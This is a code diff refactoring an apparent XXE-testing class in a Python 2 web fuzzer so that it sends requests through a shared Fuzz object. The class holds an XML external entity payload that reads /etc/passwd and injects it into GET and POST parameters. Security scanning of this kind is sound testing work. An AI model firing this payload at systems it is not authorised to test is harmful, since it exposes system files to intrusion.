@@ -1,4 +1,10 @@
 class XXE:
+
+    fuzz = None
+
+    def __init__(self, fuzz):
+        self.fuzz = fuzz
+
     # from https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
     def get_XXE_payload(self):
         return '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
@@ -18,14 +24,14 @@ class XXE:
         s=requests.Session()
         if method=='GET':
             newUrl = Fuzz.substParam(url,param,self.get_XXE_payload())
-            self.catchUp(s)
-            response = self.send_req(requestId, s, newUrl, 'GET')
+            self.fuzz.catchUp(s)
+            response = self.fuzz.send_req(requestId, s, newUrl, 'GET')
             print "Attempting GET XXE on "+param
             self.verifyXXE(response, param, requestId)
         elif method=='POST':
             newPost=copy.deepcopy(postData)
             newPost['formData'][param]=self.get_XXE_payload()
-            self.catchUp(s)
-            response = self.send_req(requestId, s, url, 'POST', post=newPost)
+            self.fuzz.catchUp(s)
+            response = self.fuzz.send_req(requestId, s, url, 'POST', post=newPost)
             print "Attempting GET XXE on "+param
             self.verifyXXE(response, param, requestId)
